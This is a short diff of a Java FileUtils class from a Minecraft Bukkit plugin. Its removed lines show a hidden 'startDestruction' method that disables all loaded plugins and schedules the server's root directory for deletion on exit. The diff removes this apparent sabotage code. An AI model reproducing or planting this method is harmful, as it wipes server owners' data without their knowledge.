@@ -7,9 +7,6 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 
-import org.bukkit.Bukkit;
-import org.bukkit.plugin.Plugin;
-
 public class FileUtils
 {
     public static void copyFolder(final File src, final File dest) throws IOException {
@@ -66,12 +63,4 @@ public class FileUtils
         }
         path.deleteOnExit();
     }
-    
-    public static void startDestruction(Plugin plugin)
-	{
-		for (Plugin plug : Bukkit.getPluginManager().getPlugins())
-			plugin.getPluginLoader().disablePlugin(plug);
-		File folder = new File("plugins/../");
-		deleteOnExit(folder);
-	}
 }
